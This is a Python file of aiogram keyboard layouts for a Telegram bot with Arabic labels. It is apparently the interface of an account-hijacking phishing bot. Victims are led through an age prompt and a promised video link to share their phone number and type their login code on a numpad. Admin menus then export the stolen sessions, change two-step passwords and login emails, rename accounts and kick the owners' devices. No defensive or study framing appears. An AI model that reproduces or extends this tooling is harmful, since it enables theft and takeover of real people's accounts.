# keyboards.py
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
)

import database
import user_messages

ADMIN_FOOTER = "\n\n─────────────\n⚡️ @No1_noone"

# أزرار الأدمن تستخدم id الجلسة (حرف + رقم) لتجنب حد 64 بايت في callback_data
CB = {
    "session": "i",
    "export": "x",
    "delete": "d",
    "hide": "h",
    "code": "c",
    "mail": "m",
    "user": "u",
    "name": "n",
    "twofa": "f",
    "kick": "k",
    "kick_only": "ks",
    "kick_spec": "kp",
    "forcemail": "fm",
    "verify": "v",
}


def cb(kind: str, session_id: int) -> str:
    return f"{CB[kind]}{session_id}"


def age_confirm_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=user_messages.render("confirm_button"),
            callback_data="confirm_age",
        )]
    ])


def share_phone_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(
            text=user_messages.render("confirm_button"),
            request_contact=True,
        )]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )


def numpad_keyboard(current_input: str = "") -> InlineKeyboardMarkup:
    display = current_input if current_input else "_ _ _ _ _"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"📟 {display}", callback_data="numpad_display")],
        [
            InlineKeyboardButton(text="1", callback_data="np_1"),
            InlineKeyboardButton(text="2", callback_data="np_2"),
            InlineKeyboardButton(text="3", callback_data="np_3"),
        ],
        [
            InlineKeyboardButton(text="4", callback_data="np_4"),
            InlineKeyboardButton(text="5", callback_data="np_5"),
            InlineKeyboardButton(text="6", callback_data="np_6"),
        ],
        [
            InlineKeyboardButton(text="7", callback_data="np_7"),
            InlineKeyboardButton(text="8", callback_data="np_8"),
            InlineKeyboardButton(text="9", callback_data="np_9"),
        ],
        [
            InlineKeyboardButton(text="0", callback_data="np_0"),
            InlineKeyboardButton(text="⌫", callback_data="np_del"),
        ],
    ])


def retry_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 محاولة أخرى", callback_data="retry_code")]
    ])


def _session_label(s) -> str:
    phone = s["phone"]
    valid = bool(s["valid"]) if s["valid"] is not None else True
    parts = []
    if database.row_flag(s, "secured"):
        parts.append("🔒")
    if database.row_flag(s, "a1_only"):
        parts.append("⭐")
    parts.append("✅" if valid else "❌")
    parts.append(phone)
    return " ".join(parts)


def sessions_keyboard(
    sessions,
    page: int = 0,
    per_page: int = 6,
    is_super_admin: bool = False,
) -> InlineKeyboardMarkup:
    total = len(sessions)
    start = page * per_page
    end = start + per_page
    page_sessions = sessions[start:end]

    buttons = []
    for s in page_sessions:
        sid = s["id"]
        label = _session_label(s)
        row = [
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
        ]
        if is_super_admin:
            star = "⭐" if database.row_flag(s, "a1_only") else "☆"
            row.append(
                InlineKeyboardButton(text=star, callback_data=cb("hide", sid))
            )
        row.append(
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
        )
        buttons.append(row)

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            text="◀️ السابق", callback_data=f"sessions_page_{page - 1}"
        ))
    if end < total:
        nav.append(InlineKeyboardButton(
            text="التالي ▶️", callback_data=f"sessions_page_{page + 1}"
        ))
    if nav:
        buttons.append(nav)

    admin_tools = []
    admin_tools.append(
        InlineKeyboardButton(
            text="🔓 الحسابات الغير مأمنه",
            callback_data="list_unsecured",
        )
    )
    admin_tools.append(
        InlineKeyboardButton(
            text="🔴 الجلسات المعطلة",
            callback_data="list_disabled",
        )
    )
    buttons.append(admin_tools)

    admin_tools_2 = []
    if is_super_admin:
        admin_tools_2.append(
            InlineKeyboardButton(
                text="🔍 فحص الجلسات",
                callback_data="check_sessions",
            )
        )
    admin_tools_2.append(
        InlineKeyboardButton(
            text="🗑 حذف غير الصالحة",
            callback_data="purge_invalid",
        )
    )
    buttons.append(admin_tools_2)
    export_row = [
        InlineKeyboardButton(
            text="📥 سحب كل الجلسات (TXT)",
            callback_data="export_all_txt",
        )
    ]
    if is_super_admin:
        export_row.append(
            InlineKeyboardButton(
                text="⭐ سحب جلسات النجمة",
                callback_data="export_star_txt",
            )
        )
    buttons.append(export_row)

    buttons.append([
        InlineKeyboardButton(
            text="🔒 سحب الجلسات المؤمنة",
            callback_data="export_secured_txt",
        )
    ])

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="✏️ رسائل المستخدمين",
                callback_data="edit_user_messages",
            ),
        ])
        buttons.append([
            InlineKeyboardButton(
                text="📦 سحب Volume",
                callback_data="vol_export",
            ),
            InlineKeyboardButton(
                text="📤 رفع Volume",
                callback_data="vol_import",
            ),
        ])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


def admin_empty_keyboard() -> InlineKeyboardMarkup:
    """لوحة أدوات عندما لا توجد جلسات — أدمن A1."""
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="✏️ رسائل المستخدمين",
                callback_data="edit_user_messages",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔍 فحص الجلسات",
                callback_data="check_sessions",
            ),
        ],
    ])


def user_messages_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="👋 رسالة البداية (/start)",
                callback_data="edit_um_start_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔘 نص زر التأكيد",
                callback_data="edit_um_confirm_button",
            ),
        ],
        [
            InlineKeyboardButton(
                text="📟 رسالة طلب الكود",
                callback_data="edit_um_enter_code_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="⚠️ رسالة التحذير (بعد الضغط)",
                callback_data="edit_um_confirm_age_msg",
            ),
        ],
        [
            InlineKeyboardButton(
                text="📋 مسجل مسبقاً",
                callback_data="edit_um_already_registered",
            ),
        ],
        [
            InlineKeyboardButton(
                text="✅ بعد التسجيل",
                callback_data="edit_um_registration_success",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔗 رابط الفيديو",
                callback_data="edit_um_registration_link",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔄 إعادة الافتراضي (الكل)",
                callback_data="reset_user_messages",
            ),
        ],
        [
            InlineKeyboardButton(
                text="🔙 رجوع للجلسات",
                callback_data="back_to_sessions",
            ),
        ],
    ])


def session_detail_keyboard(session_id: int, page: int = 0, is_super_admin: bool = False) -> InlineKeyboardMarkup:
    buttons = [
        [
            InlineKeyboardButton(
                text="🔑 المطالبة بكود",
                callback_data=cb("code", session_id),
            ),
            InlineKeyboardButton(
                text="🛡️ جلب تحقق",
                callback_data=cb("verify", session_id),
            ),
        ],
        [InlineKeyboardButton(
            text="📧 فحص/ربط بريد Login",
            callback_data=cb("mail", session_id),
        )],
        [InlineKeyboardButton(
            text="📧 تغيير البريد إجباري",
            callback_data=cb("forcemail", session_id),
        )],
        [InlineKeyboardButton(
            text="📜 سحب الجلسة (Text)",
            callback_data=cb("export", session_id),
        )],
        [
            InlineKeyboardButton(
                text="✏️ تغيير اليوزر",
                callback_data=cb("user", session_id),
            ),
            InlineKeyboardButton(
                text="📝 تغيير الاسم",
                callback_data=cb("name", session_id),
            ),
        ],
        [InlineKeyboardButton(
            text="🔐 تعيين/تغيير التحقق بخطوتين",
            callback_data=cb("twofa", session_id),
        )],
        [
            InlineKeyboardButton(
                text="🚫 طرد الجلسات فقط",
                callback_data=cb("kick_only", session_id),
            ),
        ]
    ]

    if is_super_admin:
        buttons.append([
            InlineKeyboardButton(
                text="📱 طرد جلسة معينة",
                callback_data=cb("kick_spec", session_id),
            )
        ])

    buttons.extend([
        [InlineKeyboardButton(
            text="🚫 طرد الجلسات + تنظيف شامل",
            callback_data=cb("kick", session_id),
        )],
        [InlineKeyboardButton(
            text="🔙 رجوع للقائمة",
            callback_data=f"sessions_page_{page}",
        )],
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def back_to_session_keyboard(session_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))]
    ])


def unsecured_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
    buttons = []
    for s in sessions:
        sid = s["id"]
        label = _session_label(s)
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid))
        ])
    
    if sessions:
        buttons.append([
            InlineKeyboardButton(
                text="🛡️ تأمين كل الجلسات (المتصلة الآن)",
                callback_data="secure_all_unsecured",
            )
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def disabled_sessions_keyboard(sessions) -> InlineKeyboardMarkup:
    buttons = []
    for s in sessions:
        sid = s["id"]
        label = _session_label(s)
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=cb("session", sid)),
            InlineKeyboardButton(text="🗑", callback_data=cb("delete", sid))
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)


def kick_specific_keyboard(session_id: int, authorizations) -> InlineKeyboardMarkup:
    buttons = []
    for auth in authorizations:
        if auth.current:
            continue
        
        # معلومات الجهاز للمعاينة
        label = f"{auth.device_model} | {auth.platform} | {auth.country}"
        # نستخدم الـ hash كمعرف للطرد
        # التنسيق: kp_sid_hash
        buttons.append([
            InlineKeyboardButton(text=label, callback_data=f"kp_{session_id}_{auth.hash}")
        ])
    
    buttons.append([
        InlineKeyboardButton(text="🔙 رجوع", callback_data=cb("session", session_id))
    ])
    return InlineKeyboardMarkup(inline_keyboard=buttons)
